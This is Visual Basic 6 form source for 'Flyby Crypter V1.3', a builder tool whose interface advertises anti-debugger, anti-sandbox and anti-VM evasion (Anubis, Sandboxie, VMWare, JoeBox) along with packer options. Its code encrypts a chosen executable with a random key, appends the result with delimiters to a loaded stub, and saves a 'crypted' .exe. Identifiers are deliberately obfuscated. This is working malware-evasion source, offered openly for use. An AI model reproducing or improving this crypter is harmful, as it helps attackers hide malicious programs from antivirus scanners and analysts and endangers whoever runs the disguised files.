VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.OCX"
Begin VB.Form farma 
   BackColor       =   &H00FF8080&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Flyby Crypter V1.3 - Gangster136"
   ClientHeight    =   6615
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   7020
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6615
   ScaleWidth      =   7020
   StartUpPosition =   2  'CenterScreen
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "SECRET ANTI ??"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   9
      Left            =   3960
      TabIndex        =   21
      Top             =   3960
      Width           =   2895
   End
   Begin VB.PictureBox KewlButtons1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1215
      Left            =   5040
      ScaleHeight     =   1155
      ScaleWidth      =   1755
      TabIndex        =   20
      Top             =   5280
      Width           =   1815
   End
   Begin VB.PictureBox chameleonButton2 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2880
      ScaleHeight     =   315
      ScaleWidth      =   1875
      TabIndex        =   19
      Top             =   5280
      Width           =   1935
   End
   Begin VB.PictureBox chameleonButton1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   -1  'True
      EndProperty
      Height          =   375
      Left            =   4320
      ScaleHeight     =   315
      ScaleWidth      =   2355
      TabIndex        =   18
      Top             =   1440
      Width           =   2415
   End
   Begin VB.PictureBox chameleonButton3 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   -1  'True
      EndProperty
      Height          =   375
      Left            =   2880
      ScaleHeight     =   315
      ScaleWidth      =   1875
      TabIndex        =   17
      Top             =   6120
      Width           =   1935
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti Debugger"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   300
      Index           =   0
      Left            =   120
      TabIndex        =   13
      Top             =   3960
      Width           =   2655
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti Anubis"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   1
      Left            =   120
      TabIndex        =   12
      Top             =   2520
      Width           =   2895
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti Sandboxie"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   2
      Left            =   120
      TabIndex        =   11
      Top             =   2880
      Width           =   3015
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti Vitrtual Box"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   3
      Left            =   120
      TabIndex        =   10
      Top             =   3240
      Width           =   3375
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti Norman"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   5
      Left            =   3960
      TabIndex        =   9
      Top             =   2520
      Width           =   3135
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti CW Sandbox"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   6
      Left            =   3960
      TabIndex        =   8
      Top             =   2880
      Width           =   3135
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti VMWare"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   7
      Left            =   3960
      TabIndex        =   7
      Top             =   3240
      Width           =   3135
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Activate EOF"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   8
      Left            =   120
      TabIndex        =   6
      Top             =   3600
      Width           =   3255
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Anti JoeBox"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   4
      Left            =   3960
      TabIndex        =   5
      Top             =   3600
      Width           =   3135
   End
   Begin VB.OptionButton Option1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Use UPX"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   3960
      TabIndex        =   4
      Top             =   4920
      Width           =   1575
   End
   Begin VB.OptionButton Option2 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Use FSG"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   1560
      TabIndex        =   3
      Top             =   4920
      Width           =   1575
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   6360
      Top             =   4680
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox Text3 
      Height          =   1215
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   2
      Top             =   5280
      Width           =   2655
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   2880
      TabIndex        =   1
      Top             =   5760
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      Height          =   315
      Left            =   360
      Locked          =   -1  'True
      OLEDropMode     =   1  'Manual
      TabIndex        =   0
      Top             =   1440
      Width           =   3855
   End
   Begin VB.Line Line3 
      X1              =   4920
      X2              =   4920
      Y1              =   5280
      Y2              =   6480
   End
   Begin VB.Line Line2 
      X1              =   240
      X2              =   6720
      Y1              =   1920
      Y2              =   1920
   End
   Begin VB.Line Line1 
      X1              =   360
      X2              =   6720
      Y1              =   4440
      Y2              =   4440
   End
   Begin VB.Image Image1 
      Height          =   900
      Left            =   0
      Picture         =   "Form1.frx":0000
      Top             =   0
      Width           =   7020
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      Caption         =   "Select The file to crypt :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   495
      Index           =   0
      Left            =   1200
      TabIndex        =   16
      Top             =   840
      Width           =   5175
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Select The Options For crypting"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   855
      Index           =   1
      Left            =   960
      TabIndex        =   15
      Top             =   1920
      Width           =   6735
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Select Your Compression"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   2
      Left            =   1560
      TabIndex        =   14
      Top             =   4560
      Width           =   4455
   End
End
Attribute VB_Name = "farma"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private Sub chameleonButton1_Click()
On Error GoTo Ende
    With CommonDialog1
        .CancelError = True
        .DialogTitle = "Select The File to Crypt!"
        .DefaultExt = ".exe"
        .Filter = "Executables|*.exe"
    End With
    CommonDialog1.ShowOpen
    Text1.Text = CommonDialog1.FileName
    Text3.Text = Text3.Text & "Exe changed: " & Text1.Text & vbCrLf
Ende:
End Sub

Private Sub chameleonButton2_Click()
    Text2.Text = ""
    For i = 1 To 6
        If i = 2 Or i = 4 Or i = 6 Then
            Text2.Text = Text2.Text & qfiqiuiuiufiuezpoziocpgpqd
        Else
            Text2.Text = Text2.Text & whcguqsiiuufvtwyuvguiqsz
        End If
    Next i
    Text3.Text = Text3.Text & "New Key generated: " & Text2.Text & vbCrLf
End Sub

Private Sub chameleonButton3_Click()
    Dim Buffer() As Byte
    Dim ResBuffer() As Byte
    Dim siqsfiufiuziuposiqekokdv As String
    Dim Buffer2 As String
    Dim zdizizaijfijeqojazojzzzf As String
    
    With CommonDialog1
        .CancelError = True
        .DialogTitle = "Choose Where To Save The Crypted File.."
        .DefaultExt = ".exe"
        .Filter = "Executables|*.exe"
        .FileName = "FlybyCrypted.exe"
    End With
    CommonDialog1.ShowSave
    zdizizaijfijeqojazojzzzf = CommonDialog1.FileName
    
    ResBuffer() = LoadResData(101, "STUB")
    Open zdizizaijfijeqojazojzzzf For Binary As #2
    Put #2, , ResBuffer()
    Close #2

    Text3.Text = Text3.Text & "File read.." & vbCrLf
    Text3.Text = Text3.Text & "Crypting File.." & vbCrLf
    
    EncodeArrayB csqvdjovpoxcvvvvcvc(Text1.Text), Text2.Text
    Buffer() = encoded()
    
    Buffer2 = StrConv(csqvdjovpoxcvvvvcvc(Text1.Text), vbUnicode)
    
    Open zdizizaijfijeqojazojzzzf For Binary As #1
    Put #1, LOF(1) + 1, "<F1l3>"
    Put #1, LOF(1) + 1, Buffer()
    Put #1, LOF(1) + 1, "<F1l3>"
    Put #1, LOF(1) + 1, Text2.Text
    Put #1, LOF(1) + 1, "<F1l3>"
    Put #1, LOF(1) + 1, siqsfiufiuziuposiqekokdv
    Close #1
    
    'qjfjqejfjdkjgmklsmkle zdizizaijfijeqojazojzzzf 'removed cause it crashes the eof data
    
    Open zdizizaijfijeqojazojzzzf For Binary As #1
    Put #1, LOF(1) + 1, siqsfiufiuziuposiqekokdv
    Close #1
    
    Text3.Text = Text3.Text & "Successfull!" & vbCrLf
    MsgBox "Your file has been crypted!", 64, "Flyby.Crypter"
End Sub

Private Function qfiqiuiuiufiuezpoziocpgpqd() As Integer
    Randomize
    var1 = Int(9 * Rnd)
    qfiqiuiuiufiuezpoziocpgpqd = var1
End Function

Private Function whcguqsiiuufvtwyuvguiqsz() As String
Anfang:
    Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Randomize
    var1 = Int(26 * Rnd)
    If var1 = 0 Then GoTo Anfang
    whcguqsiiuufvtwyuvguiqsz = Mid(Keyset, var1, 1)
End Function

Private Sub Form_Load()
    Randomize
    Me.Show
    Text3.Text = Text3.Text & "Flyby.Crypter Loaded!" & Text2.Text & vbCrLf
    Text2.Text = ""
    For i = 1 To 6
        If i = 2 Or i = 4 Or i = 6 Then
            Text2.Text = Text2.Text & qfiqiuiuiufiuezpoziocpgpqd
        Else
            Text2.Text = Text2.Text & whcguqsiiuufvtwyuvguiqsz
        End If
    Next i
    Text3.Text = Text3.Text & "Key Generated: " & Text2.Text & vbCrLf
End Sub

Private Sub Text1_Change()
    Text1.SelStart = Len(Text1.Text)
End Sub

Private Sub Text1_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Right(Data.Files.Item(1), 4) = ".exe" Then
        Text1.Text = Data.Files.Item(1)
        Text3.Text = Text3.Text & "Executable Chosen: " & Text1.Text & vbCrLf
    Else
        MsgBox "This is not an Executable", 16, "Flyby.Crypter"
    End If
End Sub

Private Sub Text3_Change()
    Text3.SelStart = Len(Text3.Text)
End Sub

Private Function csqvdjovpoxcvvvvcvc(ByVal vvivjcvviviivvvvood As String) As Byte()
   Dim nFile As Integer
   Dim arrFile() As Byte
   nFile = FreeFile
   Open vvivjcvviviivvvvood For Binary As #nFile
      ReDim arrFile(LOF(nFile) - 1)
      Get #nFile, , arrFile
   Close #nFile
   csqvdjovpoxcvvvvcvc = arrFile
End Function
